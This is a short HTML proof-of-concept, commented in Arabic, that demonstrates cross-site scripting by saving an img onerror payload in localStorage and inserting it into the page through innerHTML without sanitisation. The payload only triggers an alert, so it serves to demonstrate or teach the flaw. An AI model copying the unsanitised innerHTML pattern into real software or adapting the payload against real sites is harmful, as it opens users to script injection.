<!-- PoC لتحفيز XSS عبر innerHTML -->
<!DOCTYPE html>
<html>
<head>
  <title>XSS PoC - innerHTML + localStorage</title>
</head>
<body>
  <script>
    // إعداد الحمولة الخبيثة في التخزين
    localStorage.setItem("xss_payload", `<img src=x onerror=alert('🔥 XSS Exploited via localStorage!')>`);

    // تنفيذ الثغرة عبر innerHTML بدون تعقيم
    const div = document.createElement('div');
    div.innerHTML = localStorage.getItem("xss_payload"); // ⚠️ نقطة التنفيذ
    document.body.appendChild(div);
  </script>
</body>
</html>
